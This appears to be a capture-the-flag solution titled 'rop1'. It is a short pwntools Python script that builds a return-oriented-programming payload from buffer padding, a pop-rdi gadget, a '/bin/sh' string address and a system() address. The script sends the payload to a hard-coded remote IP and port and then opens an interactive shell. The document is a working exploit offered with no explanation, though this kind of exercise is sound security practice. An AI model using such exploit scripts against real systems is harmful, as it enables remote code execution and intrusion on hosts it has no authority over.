# rop1
```python
from pwn import *
sh_addr=0x601070
sys_addr=0x400630
rdi_addr=0x4008e3
pay='a'*(0x4+8)+p64(rdi_addr)+p64(sh_addr)+p64(sys_addr)
#p=process('./rop1')
p=remote('129.211.58.26',10001)
p.sendline(pay)
p.interactive()
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbODA3Njk3MDgzXX0=
-->